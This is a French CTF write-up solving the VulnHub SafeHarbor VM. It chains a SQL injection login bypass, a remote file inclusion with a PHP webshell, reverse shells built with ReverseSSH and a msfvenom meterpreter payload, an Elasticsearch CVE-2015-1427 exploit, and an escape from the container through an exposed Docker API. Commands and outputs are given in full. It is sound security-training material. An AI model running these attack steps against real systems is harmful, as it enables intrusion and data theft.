# Solution du CTF SafeHarbor de VulnHub

Lorem Ipsum
-----------

A la recherche d'un CTF pour exercer les skills de pivot, je suis tombé sur [SafeHarbor](http://www.vulnhub.com/entry/safeharbor-1,377/) créé par un certain [Dylan Barker](https://github.com/AbsoZed).  

Ce CTF est de type boot2root donc tourné vers un scénario réaliste.  

```plain
$ sudo nmap -T5 -sC -sV -p- 192.168.56.11
[sudo] Mot de passe de root : 
Starting Nmap 7.92 ( https://nmap.org )
Nmap scan report for 192.168.56.11
Host is up (0.011s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE    SERVICE VERSION
22/tcp   open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 fc:c6:49:ce:9b:54:7f:57:6d:56:b3:0a:30:47:83:b4 (RSA)
|   256 73:86:8d:97:2e:60:08:8a:76:24:3c:94:72:8f:70:f7 (ECDSA)
|_  256 26:48:91:66:85:a2:39:99:f5:9b:62:da:f9:87:4a:e6 (ED25519)
80/tcp   open     http    nginx 1.17.4
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Login
|_http-server-header: nginx/1.17.4
2375/tcp filtered docker
```

Un classique serveur web accompagné de son serveur SSH. L'auteur a aussi fait le choix de filtrer les paquets à destination du port Docker... indice ?  

J'ai eu quelques désagréments sur quelques challenges récents du coup je préfère sortir direct l'artillerie lourde et tester différentes extensions lors de l'énumération sur le serveur web :  

```plain
$ feroxbuster -u http://192.168.56.11/ -w directory-list-2.3-big.txt -x php,html,zip,tar.gz,txt -n

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.4.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.56.11/
 🚀  Threads               │ 50
 📖  Wordlist              │ directory-list-2.3-big.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.4.0
 💲  Extensions            │ [php, html, zip, tar.gz, txt]
 🚫  Do Not Recurse        │ true
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
200       37l       97w        0c http://192.168.56.11/login.php
200        4l       37w      242c http://192.168.56.11/changelog.txt
200      991l     5143w        0c http://192.168.56.11/phpinfo.php
```

Regarder le code HTML de la page d'accueil est aussi une habitude que l'on prend vite sur les CTFs. Ici ça semble intéressant :  

```html
<html lang="en">
<!-- Harbor Bank Online v2 - See changelog.txt for version details.-->
<head>
```

Le changelog en question mentionne (sans les détails) une vulnérabilité qui a été corrigée mais n'est pas poussée en prod. Ils indiquent aussi que cela allait être fait *"doucement"* (?).  

Le *phpinfo* est comme d'habitude une mire d'or en tant que prise d'informations. Ainsi on devine rapidement au nom d'hôte que le serveur tourne dans un Docker et on découvre que l'utilisateur courant qui est *www-data* dispose d'un dossier personnel dans */home* ce qui est pour le coup moins courant.  

Si jamais un serveur SSH est accessible on pourra certainement jouer avec les clés SSH ce qui n'est habituellement pas possible car le home correspond souvent à la racine web dont *root* est le propriétaire.  

Pour le reste le site est justement servi par */var/www/html* ce qui est standard.  

Login bypass
------------

En testant la page de login pour une faille SQL (on peut juste placer des guillemets et apostrophes dans les champs) j'obtiens une erreur évocatrice :  

```plain

Warning: mysqli_num_rows() expects parameter 1 to be mysqli_result, boolean given in /var/www/html/login.php on line 16
```

Bizarrement la vulnérabilité ne semble pas toujours présente, d'ailleurs SQLmap ne parvient pas à dumper quoi que ce soit mais valide tout de même ce cas de bypass malgré lui puisqu'il accède à la page normalement protégée :  

```plain
$ python sqlmap.py -u http://192.168.56.11/ --data "user=admin&password=admin&s=Login" --risk 3 --level 5 --dbms mysql

--- snip ---
[10:24:53] [INFO] testing if POST parameter 'user' is dynamic
[10:24:53] [WARNING] POST parameter 'user' does not appear to be dynamic
[10:24:53] [INFO] heuristic (basic) test shows that POST parameter 'user' might be injectable (possible DBMS: 'MySQL')
[10:24:53] [INFO] testing for SQL injection on POST parameter 'user'
[10:24:53] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
got a 302 redirect to 'http://192.168.56.11:80/OnlineBanking/index.php?p=welcome'. Do you want to follow? [Y/n]
--- snip ---
```

L'appli web permet de transférer des sommes d'un compte de notre choix. On a ainsi la liste d'utilisateurs suivante :  

```plain
Admin
Bill
Steve
Timothy
Jill
Quinten
```

A conserver au cas où. Pour le reste l'URL vers laquelle on est redirigée a un format qui pourrait correspondre à une faille d'inclusion PHP. Je tente donc d'ajouter un préfixe pour tester :  

```plain
http://192.168.56.11/OnlineBanking/index.php?p=http://127.0.0.1/welcome
```

Et ça paye :  

```plain
Warning: include(http://127.0.0.1/welcome.php): failed to open stream: Connection refused in /var/www/html/OnlineBanking/index.php on line 13

Warning: include(): Failed opening 'http://127.0.0.1/welcome.php' for inclusion (include_path='.:/usr/local/lib/php') in /var/www/html/OnlineBanking/index.php on line 13
```

J'ai été assez chanceux sur ce coup puisque si on passe *welcome3* au paramètre alors aucune erreur n'est générée. Il y a donc une espèce de whitelisting qui est appliquée et les préfixes ne sont pas pris en compte.  

Sans utilisation du préfixe j'aurais potentiellement perdu du temps avant de trouver.  

Il ne reste plus qu'à fournir un serveur web (*python3 -m http.server*) contenant un fichier *welcome.php* qui exécutera le code PHP suivant :  

```php
<?php system($_GET['cmd']); ?>
```

On obtient ainsi notre exécution de commande :  

```plain
http://192.168.56.11/OnlineBanking/index.php?p=http://192.168.56.1:8000/welcome&cmd=id
```

Ça peut être assez contraignant de conserver ce shell lié à notre serveur (reboot de la VM, changement d'IP, etc) alors le mieux est de recopier le shell où c'est possible sur le serveur (ici */tmp/welcome.php*).  

First blood
-----------

L'accès permet de valider qu'on est dans un environnement container-isé : il n'y a que très peu d'outils réseau, notamment SSH est aux abonnés absents.  

Je vais donc me servir de [ReverseSSH](https://github.com/Fahrj/reverse-ssh) (ici en version 1.2.0).  

D'abord je met un port en écoute sur ma machine pour un scénario de reverse-shell :  

```plain
$ ./reverse-sshx64 -l -p 2244 -v
```

Et sur le Docker (via le webshell du coup) :  

```plain
$ reverse-ssh -v -p 2424 192.168.56.1 
2021/12/16 12:08:44 Dialling home via ssh to 192.168.56.1:2244
2021/12/16 12:08:44 Success: listening at home on 127.0.0.1:8888
2021/12/16 12:09:05 Successful authentication with password from www-data@127.0.0.1:43874
2021/12/16 12:09:05 New login from www-data@127.0.0.1:43874
2021/12/16 12:09:05 PTY requested
2021/12/16 12:09:05 Could not start shell: fork/exec /bin/bash: no such file or directory
```

Il faut répéter la commande avec *-s /bin/sh* pour fixer ce contre temps.  

Cela établit un tunnel SSH. Il faut ensuite utiliser le client SSH standard pour obtenir le shell via ce tunnel sur le port 8888 (valeur par défaut qui peut se changer avec l'option *-b* de *ReverseSSH*).  

```bash
$ ssh -p 8888 brudi@127.0.0.1
```

Le nom d'utilisateur importe peu, il n'est pas pris en compte. Le mot de passe à saisir est hardcodé, il s'agit de *letmeinbrudipls* mais c'est possible de le changer via recompilation de l'outil.  

L'accès plus civilisé me permet de vérifier mes hypothèses comme la whitelist :  

```php
<?php

session_start();

if(isset($_SESSION["loggedin"])){

        $currentURL = $_GET['p'] . '.php';
        $namingWhitelist = ["welcome.php", "balance.php", "transfer.php", "about.php", "account.php", "logout.php"];

        foreach($namingWhitelist as $uri){

                if(strpos($currentURL, $uri) !== FALSE){
                        include($currentURL);
        }

}

} else {
        header("Location: /");
}
```

Il y a deux versions de la page de login et un diff permet de rapidement voir le fix pour la faille SQL :  

```php
-    $user = $_POST['user'];
-    $pass = $_POST['password'];     
+    $user = mysqli_real_escape_string($dbServer, $_POST['user']);
+    $pass = mysqli_real_escape_string($dbServer, $_POST['password']);
     $queryResult = mysqli_query($dbServer, "SELECT * FROM users where username = '$user' and password = '$pass'");
```

Enfin on trouve les identifiants MySQL :  

```php
$dbServer = mysqli_connect('mysql','root','TestPass123!', 'HarborBankUsers');
```

On peut réutiliser le même tunnel comme s'il s'agissait d'un serveur SSH classique.  

Je ne suis toutefois pas parvenu à uploader un fichier avec *scp* mais ça a très bien fonctionné avec *sftp*.  

Au passage, ce serveur est particulier car bien que l'on y trouve les scripts PHP, aucune configuration Apache ou Nginx n'est présente mais j'y reviendrait à la fin.  

In the neighboorhood
--------------------

*LinPEAS* remonte quelques informations sur le réseau, à commencer par l'interface :  

```plain
eth0      Link encap:Ethernet  HWaddr 02:42:AC:14:00:08  
          inet addr:172.20.0.8  Bcast:172.20.255.255  Mask:255.255.0.0
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:2686 errors:0 dropped:0 overruns:0 frame:0
          TX packets:2964 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:921973 (900.3 KiB)  TX bytes:423591 (413.6 KiB)
```

Ainsi que quelques adresses dans le cache ARP :  

```plain
harborbank_apache_1.harborbank_backend (172.20.0.7) at 02:42:ac:14:00:07 [ether]  on eth0
harborbank_apache_v2_1.harborbank_backend (172.20.0.6) at 02:42:ac:14:00:06 [ether]  on eth0
harborbank_apache_v2_2.harborbank_backend (172.20.0.5) at 02:42:ac:14:00:05 [ether]  on eth0
```

Comme on a vu plus tôt avec les credentials MySQL, le serveur de base de données est sur un autre container nommé *mysql* :  

```plain
/var/www/html/OnlineBanking $ nc mysql 3306 -vz
mysql (172.20.0.138:3306) open
```

On utiliser SSH pour faire une redirection de port locale :  

```bash
$ ssh -p 8888 -L 33306:172.20.0.138:3306 127.0.0.1
```

et ça dumpe :  

```plain
$ mysql -u root -h 127.0.0.1 -P 33306 -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 20
Server version: 5.6.40 MySQL Community Server (GPL)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| HarborBankUsers    |
| mysql              |
| performance_schema |
+--------------------+
4 rows in set (0.015 sec)

MySQL [(none)]> use HarborBankUsers;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MySQL [HarborBankUsers]> show tables;
+---------------------------+
| Tables_in_HarborBankUsers |
+---------------------------+
| users                     |
+---------------------------+
1 row in set (0.003 sec)

MySQL [HarborBankUsers]> select * from users;
+----+----------+------------------+----------+
| id | username | password         | balance  |
+----+----------+------------------+----------+
|  6 | Admin    | yHNJ4Nm@HaVU-=XQ |     0.00 |
|  7 | Bill     | e_PLJ3cyVEVnxY7  |  2384.94 |
|  8 | Steve    | z_&=_KwMM*3D7AzC | 92324.37 |
|  9 | Jill     | ^&3JneRScU*Tt4-v |  3579.42 |
| 10 | Timothy  | $hBW!!NL52azb+HY |   514.90 |
| 11 | Quinten  | mvTvt3u-9CeVB@26 | 62124.84 |
+----+----------+------------------+----------+
6 rows in set (0.003 sec)
```

Ces identifiants ne permettent malheureusement pas d'accéder à un compte sur le service SSH. Ça aurait été un peu rapide à ce stade du CTF !  

Inutile de perdre du temps avec un Proxychains, l'upload d'un Nmap compilé statiquement nous fera gagner un temps précieux sur la découverte du réseau interne.  

```plain
~ $ ./nmap -sP 172.20.0.8/16 -T5

Starting Nmap 7.11 ( https://nmap.org ) at 2021-12-16 12:42 UTC
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for 172.20.0.1
Host is up (0.0024s latency).
Nmap scan report for harborbank_kibana_1.harborbank_backend (172.20.0.2)
Host is up (0.0015s latency).
Nmap scan report for harborbank_logstash_1.harborbank_backend (172.20.0.3)
Host is up (0.0010s latency).
Nmap scan report for harborbank_nginx_1.harborbank_backend (172.20.0.4)
Host is up (0.00083s latency).
Nmap scan report for harborbank_apache_v2_2.harborbank_backend (172.20.0.5)
Host is up (0.00061s latency).
Nmap scan report for harborbank_apache_v2_1.harborbank_backend (172.20.0.6)
Host is up (0.00053s latency).
Nmap scan report for harborbank_apache_1.harborbank_backend (172.20.0.7)
Host is up (0.00045s latency).
Nmap scan report for 707af7b0d61f (172.20.0.8)
Host is up (0.00035s latency).
Nmap scan report for harborbank_elasticsearch_1.harborbank_backend (172.20.0.124)
Host is up (0.00085s latency).
Nmap scan report for harborbank_mysql_1.harborbank_backend (172.20.0.138)
Host is up (0.00027s latency).

Nmap scan report for 172.20.0.1
Host is up (0.00026s latency).
Not shown: 65532 closed ports
PORT     STATE    SERVICE
22/tcp   open     ssh
80/tcp   open     http
2375/tcp filtered unknown

Nmap scan report for harborbank_kibana_1.harborbank_backend (172.20.0.2)
Host is up (0.0012s latency).
Not shown: 65534 closed ports
PORT   STATE SERVICE
80/tcp open  http

Nmap scan report for harborbank_logstash_1.harborbank_backend (172.20.0.3)
Host is up (0.0012s latency).
Not shown: 65534 closed ports
PORT     STATE SERVICE
9600/tcp open  unknown

Nmap scan report for harborbank_nginx_1.harborbank_backend (172.20.0.4)
Host is up (0.0013s latency).
Not shown: 65534 closed ports
PORT   STATE SERVICE
80/tcp open  http

Nmap scan report for harborbank_apache_v2_2.harborbank_backend (172.20.0.5)
Host is up (0.0013s latency).
Not shown: 65534 closed ports
PORT   STATE SERVICE
80/tcp open  http

Nmap scan report for harborbank_apache_v2_1.harborbank_backend (172.20.0.6)
Host is up (0.0012s latency).
Not shown: 65534 closed ports
PORT   STATE SERVICE
80/tcp open  http

Nmap scan report for harborbank_apache_1.harborbank_backend (172.20.0.7)
Host is up (0.0012s latency).
Not shown: 65534 closed ports
PORT   STATE SERVICE
80/tcp open  http

Nmap scan report for 707af7b0d61f (172.20.0.8)
Host is up (0.00028s latency).
Not shown: 65534 closed ports
PORT     STATE SERVICE
9000/tcp open  unknown

Nmap scan report for harborbank_elasticsearch_1.harborbank_backend (172.20.0.124)
Host is up (0.0014s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE
9200/tcp open  wap-wsp
9300/tcp open  unknown

Nmap scan report for harborbank_mysql_1.harborbank_backend (172.20.0.138)
Host is up (0.0013s latency).
Not shown: 65534 closed ports
PORT     STATE SERVICE
3306/tcp open  mysql
```

Les noms d'hôtes étant assez explicites je me suis attaché à extraire le titre HTML pour les différents serveurs webs. J'ai aussi remarqué que le commentaire mentionnant le changelog avait un comportement différent, certainement signe d'un mécanisme de load-balancing :  

```plain
http://172.20.0.1/
Server: nginx/1.17.4
<title>Login</title>
<!-- Harbor Bank Online v2 - See changelog.txt for version details.--> apparaît parfois
Online Banking Login

http://172.20.0.2/
Server: nginx/1.8.1
<title>Kibana 3{{dashboard.current.title ? " - "+dashboard.current.title : ""}}</title>

http://172.20.0.4/
Server: nginx/1.17.4
<title>Login</title>
<!-- Harbor Bank Online v2 - See changelog.txt for version details.--> apparaît parfois
Online Banking Login

http://172.20.0.5/
Server: Apache/2.4.33 (Unix)
X-Powered-By: PHP/7.2.7
<title>Login</title>
<!-- Harbor Bank Online v2 - See changelog.txt for version details.--> apparaît tout le temps
Online Banking Login

http://172.20.0.6/
Server: Apache/2.4.33 (Unix)
X-Powered-By: PHP/7.2.7
<title>Login</title>
<!-- Harbor Bank Online v2 - See changelog.txt for version details.--> apparaît tout le temps
Online Banking Login

http://172.20.0.7/
Server: Apache/2.4.33 (Unix)
X-Powered-By: PHP/7.2.7
<title>Login</title>
<!-- Harbor Bank Online v2 - See changelog.txt for version details.--> n’apparaît jamais
Online Banking Login
```

De la même façon que j'ai redirigé le port MySQL j'ai pu accéder au *Kibana* (interface web pour *ElasticSearch*) qui était cassé et logstash (je ne sais comment ça fonctionne mais je n'ai vu aucune astuce de RCE le concernant).  

Connaissant déjà ElasticSearch j'ai retrouvé quelques commendes cURL pour obtenir sa version, voir les indexes, etc :  

```bash
$ curl -GET "localhost:9200/"
{
  "status" : 200,
  "name" : "Scorpia",
  "cluster_name" : "elasticsearch",
  "version" : {
    "number" : "1.4.2",
    "build_hash" : "927caff6f05403e936c20bf4529f144f0c89fd8c",
    "build_timestamp" : "2014-12-16T14:11:12Z",
    "build_snapshot" : false,
    "lucene_version" : "4.10.2"
  },
  "tagline" : "You Know, for Search"
}

$ curl -GET "localhost:9200/_cluster/health?pretty"
{
  "cluster_name" : "elasticsearch",
  "status" : "yellow",
  "timed_out" : false,
  "number_of_nodes" : 1,
  "number_of_data_nodes" : 1,
  "active_primary_shards" : 10,
  "active_shards" : 10,
  "relocating_shards" : 0,
  "initializing_shards" : 0,
  "unassigned_shards" : 10
}

$ curl -GET "localhost:9200/_cat/indices?pretty"
yellow open logstash-2019.10.06 5 1     202 0 361.2kb 361.2kb 
yellow open logstash-2021.12.16 5 1 1091095 0 207.1mb 207.1mb
```

On peut ensuite dumper le contenu mais ça n'a amené à rien d'intéressant.  

At least you tried
------------------

En revanche en testant [un vieil exploit](https://www.exploit-db.com/exploits/36337) en Python on est vite fixé sur ce qu'on peut faire :  

```plain
$ python 36337.py 127.0.0.1

▓█████  ██▓    ▄▄▄        ██████ ▄▄▄█████▓ ██▓ ▄████▄    ██████  ██░ ██ ▓█████  ██▓     ██▓    
▓█   ▀ ▓██▒   ▒████▄    ▒██    ▒ ▓  ██▒ ▓▒▓██▒▒██▀ ▀█  ▒██    ▒ ▓██░ ██▒▓█   ▀ ▓██▒    ▓██▒    
▒███   ▒██░   ▒██  ▀█▄  ░ ▓██▄   ▒ ▓██░ ▒░▒██▒▒▓█    ▄ ░ ▓██▄   ▒██▀▀██░▒███   ▒██░    ▒██░    
▒▓█  ▄ ▒██░   ░██▄▄▄▄██   ▒   ██▒░ ▓██▓ ░ ░██░▒▓▓▄ ▄██▒  ▒   ██▒░▓█ ░██ ▒▓█  ▄ ▒██░    ▒██░    
░▒████▒░██████▒▓█   ▓██▒▒██████▒▒  ▒██▒ ░ ░██░▒ ▓███▀ ░▒██████▒▒░▓█▒░██▓░▒████▒░██████▒░██████▒
░░ ▒░ ░░ ▒░▓  ░▒▒   ▓▒█░▒ ▒▓▒ ▒ ░  ▒ ░░   ░▓  ░ ░▒ ▒  ░▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒░░ ▒░ ░░ ▒░▓  ░░ ▒░▓  ░
 ░ ░  ░░ ░ ▒  ░ ▒   ▒▒ ░░ ░▒  ░ ░    ░     ▒ ░  ░  ▒   ░ ░▒  ░ ░ ▒ ░▒░ ░ ░ ░  ░░ ░ ▒  ░░ ░ ▒  ░
   ░     ░ ░    ░   ▒   ░  ░  ░    ░       ▒ ░░        ░  ░  ░   ░  ░░ ░   ░     ░ ░     ░ ░   
   ░  ░    ░  ░     ░  ░      ░            ░  ░ ░            ░   ░  ░  ░   ░  ░    ░  ░    ░  ░
                                              ░                                                
 Exploit for ElasticSearch , CVE-2015-1427   Version: 20150309.1
{*} Spawning Shell on target... Do note, its only semi-interactive... Use it to drop a better payload or something
~$ id
uid=0(root) gid=0(root) groups=0(root)
```

R.I.P. ElasticSearch.  

On est root, que espérer de plus ? Un accès en dehors du container bien sûr !  

Ah! Le binaire Docker n'est pas présent sur la machine et j'ai trop la flemme d'installer une Debian 8, installer Docker, noter les librairies requises, uploader ça etc...  

On va quitter notre *ReverseSSH* et profiter des fonctionnalités de Metasploit.  

D'abord générer la backdoor :  

```plain
$ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.56.4 LPORT=4444 -f elf -o /tmp/rev_met
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 130 bytes
Final size of elf file: 250 bytes
Saved as: /tmp/rev_met
```

Qu'on uploade et exécute sur la victime. Il faut avoir préalablement lancé le handler dans Metasploit, étape que j'ai oublié de copier ici mais qui peut se voir par exemple dans [le CTF Bobby](http://devloop.users.sourceforge.net/index.php?article74/solution-du-ctf-bobby-1).  

Une fois la session Metasploit récupérée on la met en fond avec la commande *bg* (ou *background*) et on va chercher le module d'escalade de privilège adapté et lui fournir les options nécessaires (l'ID de la session, le payload, etc) :  

```plain
msf6 exploit(linux/local/docker_privileged_container_escape) > show options

Module options (exploit/linux/local/docker_privileged_container_escape):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION  1                yes       The session to run this module on

Payload options (linux/armle/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.56.4     yes       The listen address (an interface may be specified)
   LPORT  9999             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Automatic

msf6 exploit(linux/local/docker_privileged_container_escape) > check
[*] The target appears to be vulnerable. Inside Docker container and target appears vulnerable
msf6 exploit(linux/local/docker_privileged_container_escape) > run

[*] Started reverse TCP handler on 192.168.56.4:9999 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. Inside Docker container and target appears vulnerable
[*] Writing payload executable to '/tmp/cJRVto'
[*] Writing '/tmp/cJRVto' (344 bytes) ...
[*] Executing script to exploit privileged container
[*] Found container id 782f6cae2a82770972d3fecd2ed17b1bc06e0259a249ace6371897a1b8388722, copying payload to host
[*] mkdir: cannot create directory '/sys/fs/cgroup/rdma/nknDFX': Read-only file system
/bin/sh: 1: cannot create /sys/fs/cgroup/rdma/nknDFX/notify_on_release: Directory nonexistent
/bin/sh: 1: cannot create /sys/fs/cgroup/rdma/release_agent: Read-only file system
sh: 1: cannot create /sys/fs/cgroup/rdma/nknDFX/cgroup.procs: Directory nonexistent
[*] Waiting 20s for payload
[*] Exploit completed, but no session was created.
```

Ça ne fonctionne pas et pour cause le système de fichier est monté read-only :  

```plain
cgroup on /sys/fs/cgroup/rdma type cgroup (ro,nosuid,nodev,noexec,relatime,rdma)
```

On se fait jeter si on tente de remonter le FS en écriture malgré que l'on soit root.  

Cette fois c'est la bonne
-------------------------

Après un moment d'égarement je suis revenu sur ce Docker ElasticSearch qui semblait être le seul à vouloir tomber dans mes mains. Je suis retombé sur cet historique bash qui n'avait pas trop attiré mon attention :  

```bash
ls
ifconfig
ip addr
curl 172.20.0.1:2375
exit
curl 172.20.0.1:2375
exit
curl 172.20.0.1:2375
exit
curl 172.20.0.1:2375
exit
```

Et en effet il semble que ce container ait accès au port 2375 de Docker qu'on avait vu protégé.  

Metasploit dispose d'un module adapté *linux/http/docker\_daemon\_tcp* dont voici la description :  

```plain
Description:
  Utilizing Docker via unprotected tcp socket (2375/tcp, maybe 
  2376/tcp with tls but without tls-auth), an attacker can create a 
  Docker container with the '/' path mounted with read/write 
  permissions on the host server that is running the Docker container. 
  As the Docker container executes command as uid 0 it is honored by 
  the host operating system allowing the attacker to edit/create files 
  owned by root. This exploit abuses this to creates a cron job in the 
  '/etc/cron.d/' path of the host server. The Docker image should 
  exist on the target system or be a valid image from hub.docker.com.
```

Vu que la VM est en host-only il va falloir être en mesure d'utiliser une image existante en local, sans quoi :  

```plain
msf6 exploit(linux/http/docker_daemon_tcp) > show options

Module options (exploit/linux/http/docker_daemon_tcp):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   CONTAINER_ID                   no        container id you would like
   DOCKERIMAGE   alpine:latest    yes       hub.docker.com image to use
   Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS        127.0.0.1        yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT         2375             yes       The target port (TCP)
   SSL           false            no        Negotiate SSL/TLS for outgoing connections
   VHOST                          no        HTTP server virtual host

Payload options (linux/x64/shell/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.56.4     yes       The listen address (an interface may be specified)
   LPORT  7777             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Linux x64

msf6 exploit(linux/http/docker_daemon_tcp) > check
[+] 127.0.0.1:2375 - The target is vulnerable.
msf6 exploit(linux/http/docker_daemon_tcp) > run

[*] Started reverse TCP handler on 192.168.56.4:7777 
[*] Trying to pulling image from docker registry, this may take a while
[-] Exploit aborted due to failure: unknown: Failed to pull the docker image
[*] Exploit completed, but no session was created.
```

Il aura fallut d'abord utiliser la fonctionnalité de port-forwarding sur la session Meterpreter :  

```plain
meterpreter > portfwd add -l 2375 -p 2375 -r 172.20.0.1
[*] Local TCP relay created: :2375 <-> 172.20.0.1:2375
```

Ce port Docker dispose d'une interface REST et j'ai trouvé quelques astuces [sur cette page](https://github.com/carlospolop/hacktricks/blob/master/pentesting/2375-pentesting-docker.md#curl).  

On peut ainsi lister les containers de cette façon :  

```plain
$ curl -s http://127.0.0.1:2375/containers/json | python3 -m json.tool
```

Il suffit de remplacer le mot *containers* par *images* pour obtenir les images existantes. On relève l'image de base Alpine connue pour sa petite taille :  

```javascript
    {
        "Containers": -1,
        "Created": 1548886812,
        "Id": "sha256:98f5f2d17bd1c8ba230ea9a8abc21b8d7fc8727c34a4de62d000f29393cf3089",
        "Labels": null,
        "ParentId": "",
        "RepoDigests": [
            "alpine@sha256:e9a2035f9d0d7cee1cdd445f5bfa0c5c646455ee26f14565dce23cf2d2de7570"
        ],
        "RepoTags": [
            "alpine:3.2"
        ],
        "SharedSize": -1,
        "Size": 5268981,
        "VirtualSize": 5268981
    },
```

Il nous suffit de réutiliser le module Metasploit mais en spécifiant cette fois le bon nom d'image :  

```plain
$ msf6 exploit(linux/http/docker_daemon_tcp) > set DOCKERIMAGE alpine:3.2
DOCKERIMAGE => alpine:3.2
msf6 exploit(linux/http/docker_daemon_tcp) > run

[*] Started reverse TCP handler on 192.168.56.4:7777 
[*] The docker container is created, waiting for deploy
[*] Waiting for the cron job to run, can take up to 60 seconds
[*] Sending stage (38 bytes) to 192.168.56.11
[+] Deleted /etc/cron.d/KzaSSMtN
[+] Deleted /tmp/ETnACBDc
[*] Command shell session 3 opened (192.168.56.4:7777 -> 192.168.56.11:38514 ) at 2021-12-21 17:15:34 +0100

id
uid=0(root) gid=0(root) groups=0(root)
hostname
safeharbor
```

On trouve un flag ainsi qu'un flag bonus dans le dossier de *root* :  

```plain
root@safeharbor:~# cat Flag.txt 
           _-_
          |(_)|
           |||
           |||
           |||
           |||
           |||
     ^     |^|     ^
   < ^ >   <+>   < ^ >
    | |    |||    | |
     \ \__/ | \__/ /
       \,__.|.__,/
           (_)

   .---.  .--.  ,---.,---.  .-. .-.  .--.  ,---.    ,---.    .---.  ,---.    
  ( .-._)/ /\ \ | .-'| .-'  | | | | / /\ \ | .-.\   | .-.\  / .-. ) | .-.\   
 (_) \  / /__\ \| `-.| `-.  | `-' |/ /__\ \| `-'/   | |-' \ | | |(_)| `-'/   
 _  \ \ |  __  || .-'| .-'  | .-. ||  __  ||   (    | |--. \| | | | |   (    
( `-'  )| |  |)|| |  |  `--.| | |)|| |  |)|| |\ \   | |`-' /\ `-' / | |\ \   
 `----' |_|  (_))\|  /( __.'/(  (_)|_|  (_)|_| \)\  /( `--'  )---'  |_| \)\  
               (__) (__)   (__)                (__)(__)     (_)         (__) 

Congratulations! You've finished SafeHarbor! This is flag 1 of 3. 
Bonus flags will appear based on actions taken during the course of the VM.
(You got this one for a vanilla finish - no special actions taken.)

Proof: 8bd9affc2d9905e9e2dbd8e209bf53c0

Author: AbsoZed (Dylan Barker)
```

Un troisième flag est présent dans une archive ZIP mais celle-ci est protégée par mot de passe :  

```plain
root@safeharbor:~# find / -iname "*flag*" 2> /dev/null 
/root/Flag.txt
/root/Bonus_Flag_2.txt
/var/.hidden/.flags.zip
```

J'ai tenté de casser le hash avec John The Ripper sans succès.  

Sous le capot
-------------

On trouve dans */home/absozed/HarborBank/* le docker-compose ainsi que les Dockerfile des différents services.  

Le Nginx était configuré en load-balancing ce qui expliquait pourquoi la vulnérabilité SQL était sporadique (10 ans que je voulais le placer ce mot lol) :  

```plain
upstream HarborBanking {
    server harborbank_apache_1:80 weight=1;
    server harborbank_apache_v2_1:80 weight=1;
    server harborbank_apache_v2_2:80 weight=1;
}

server {
    location / {
        proxy_pass http://HarborBanking;
    }
}
```

Enfin pourquoi le container sur lequel on récupère un shell ne fait pas tourner de serveur web ? Il s'agit en fait d'un [PHP-FPM](https://fr.wikipedia.org/wiki/PHP-FPM) ce qui explique aussi pourquoi il n'y avait que le port 9000 :  

```plain
[www]
user = www-data
group = www-data
listen = 127.0.0.1:9000
```

Les serveurs Apache se chargeaient de contacter ce service pour faire exécuter le code PHP avant de renvoyer l'output.  


*Published December 21 2021 at 23:11*